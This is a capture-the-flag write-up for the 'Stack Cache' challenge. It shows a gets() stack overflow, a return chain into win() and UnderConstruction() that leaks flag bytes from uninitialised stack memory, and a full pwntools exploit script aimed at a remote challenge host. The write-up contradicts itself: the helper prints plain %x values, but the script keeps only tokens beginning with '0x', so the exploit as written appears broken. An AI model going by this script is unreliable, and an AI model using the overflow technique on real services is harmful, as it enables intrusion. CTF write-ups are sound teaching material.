# CyLab — Stack Cache

* **Platform:** CyLab Security Academy / picoCTF 2022 (Challenge ID: `306`)
* **Category:** Binary Exploitation / Uninitialized Stack Memory Leak (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg)
* **Binary:** `vuln` (32-bit x86 static ELF, compiled with Clang-12)

---

## TL;DR

The binary contains an unbounded stack buffer overflow via `gets()` in `vuln()`. While `checksec` flags canary protection, inspecting the specific disassembly of `vuln()` reveals it was compiled without a stack cookie. The binary includes a `win()` function at `0x08049810` that reads `flag.txt` into a local stack buffer, but does not print it. However, an uncalled helper function `UnderConstruction()` at `0x08049890` prints multiple uninitialized stack slots via `%x`. By chaining return addresses (`EIP = win`, returning into `UnderConstruction`), `win()` stages the flag characters onto the stack, and `UnderConstruction()` immediately reuses the identical stack frame to leak the residual dwords.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
1. **Canary False Alarm:** Statically linked binaries include libc startup routines with canary symbols (`__stack_chk_fail`), causing tools to report "Canary found". In reality, `vuln()` has no stack protector.
2. **No PIE:** Fixed base addresses at `0x08048000`. Symbols `win` (`0x08049810`) and `UnderConstruction` (`0x08049890`) are static.
3. **Information Residue:** Stack memory is not sanitized upon function return (`ret`).

---

## Static Analysis & Vulnerability

### 1. Disassembly of `vuln()`

```asm
0x08049d90 <+0>:     push   ebp
0x08049d91 <+1>:     mov    ebp, esp
0x08049d93 <+3>:     sub    esp, 0x18
0x08049d96 <+6>:     lea    eax, [ebp-0xa]      ; Buffer at [ebp - 0xa] (10 bytes)
0x08049d99 <+9>:     push   eax
0x08049d9a <+10>:    call   0x8050e60 <gets>    ; VULNERABILITY: Unbounded gets()
0x08049d9f <+15>:    add    esp, 0x4
0x08049da2 <+18>:    leave
0x08049da3 <+19>:    ret
```

Offset to return address:
$$\text{Offset} = 0\text{x}0\text{a} + 4 = 14 \text{ bytes}$$

### 2. Dual-Function Stack Frame Collision

```c
void win() {
    char flag_buf[64];
    FILE *f = fopen("flag.txt", "r");
    fgets(flag_buf, 64, f);                     // Populates stack frame with flag
    // Notice: DOES NOT PRINT FLAG!
}

void UnderConstruction() {
    int uninit_vars[10];                        // Uninitialized stack variables
    printf("Under Construction: %x %x %x...\n", // Prints uninitialized dwords
           uninit_vars[0], uninit_vars[1], ...);
}
```

When `win()` finishes, its local array `flag_buf` remains intact on the stack.
If `win()` returns directly into `UnderConstruction()`, `UnderConstruction()` reuses the exact same stack frame. Its "uninitialized" variables directly map onto the memory previously holding `flag_buf`!

```text
       Stack Memory Frame Overlay:
       
       win() Stack Frame:
       [ flag_buf[0..63]: "academy{..."       ]
       +--------------------------------------+
                         |
                         v  (win returns into UnderConstruction)
       UnderConstruction() Stack Frame:
       [ uninit_vars[0..9]: Residual Flag!    ]  <-- Printed via %x!
```

---

## Dynamic Analysis & Exploitation Strategy

### 1. ROP Chain Setup
We craft a 2-stage return chain:
```python
payload = b"A" * 14 + p32(WIN_ADDR) + p32(UC_ADDR)
```
- `b"A" * 14`: Saturates `buf` and overwrites saved EBP.
- `p32(WIN_ADDR)`: Redirects execution to `win()`.
- `p32(UC_ADDR)`: Placed as `win()`'s return address so that `win()` returns into `UnderConstruction()`.

### 2. Output Calibration & Unpacking
`UnderConstruction()` prints 10 hexadecimal tokens:
- Slot $k$ corresponds to flag byte offset:
  $$\text{offset} = 36 - 4k$$
- We collect each hexadecimal token, unpack it as a little-endian 32-bit dword (`p32()`), and place it into the output buffer at its corresponding offset.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST, PORT = "xebec.cylabacademy.net", 32268
elf = ELF("./vuln", checksec=False)
WIN = elf.symbols["win"]
UC = elf.symbols["UnderConstruction"]

def solve(io):
    # 14 bytes padding + win() + UnderConstruction()
    payload = b"A" * 14 + p32(WIN) + p32(UC)
    io.sendlineafter(b"flag\n", payload)

    data = io.recvall(timeout=4).decode(errors="replace")
    io.close()

    # Collect leaked hex tokens
    tokens = []
    for line in data.splitlines():
        for tok in line.split():
            if tok.startswith("0x") and len(tok) in (9, 10):
                tokens.append(int(tok, 16))

    # Reconstruct flag string from stack slots
    buf = bytearray(64)
    for k, v in enumerate(tokens):
        off = 36 - 4 * k
        if 0 <= off <= 60:
            buf[off:off + 4] = p32(v)

    reconstructed = bytes(buf)
    m = re.search(rb"(academy\{[^}]+\}|picoCTF\{[^}]+\})", reconstructed)
    if m:
        log.success(f"Flag captured: {m.group(1).decode()}")
    else:
        print(reconstructed)

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to xebec.cylabacademy.net on port 32268: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 32268
```

---

## Key Takeaways & Lessons

1. **Stack Memory Residuals:** Local variables are not zeroed on function epilogues. If a subsequent function frame overlaps an earlier frame, uninitialized variables faithfully preserve prior data.
2. **Chaining Return Addresses in ROP:** Placing multiple sequential return targets on the stack during a single buffer overflow allows orchestrating complex multi-function data-staging pipelines.
3. **Disassembly Verification of Canary Protection:** Never rely solely on automated tool summaries (`checksec`) for static binaries; always disassemble the target function to verify whether canary instructions (`__stack_chk_fail`) are actually present.
